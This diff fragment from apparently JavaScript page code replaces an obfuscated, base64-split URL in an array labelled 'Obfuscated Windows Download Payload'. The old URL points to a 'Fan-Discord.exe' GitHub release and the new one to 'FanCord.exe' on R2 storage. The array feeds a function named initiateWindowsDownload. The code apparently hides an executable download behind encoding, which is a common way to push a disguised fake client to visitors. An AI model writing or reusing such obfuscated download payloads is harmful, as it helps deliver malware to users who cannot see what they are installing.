@@ -10,13 +10,12 @@
 
   // Obfuscated Windows Download Payload
   const _0xPayload = [
-    'aHR0cHM6Ly9naXRo',
-    'dWIuY29tL01heWJl',
-    'bWUwMS93ZWItZmFu',
-    'Y29yZC9yZWxlYXNl',
-    'cy9kb3dubG9hZC8x',
-    'LjAvRmFuLURpc2Nv',
-    'cmQuZXhl'
+    'aHR0cHM6Ly9wdWIt',
+    'Zjg5NTYzNDRkMmY2',
+    'NDdjOWI1YjM1ZWI2',
+    'ODA4MGE1ZTEucjIu',
+    'ZGV2L0ZhbkNvcmQu',
+    'ZXhl'
   ];
 
   function initiateWindowsDownload() {
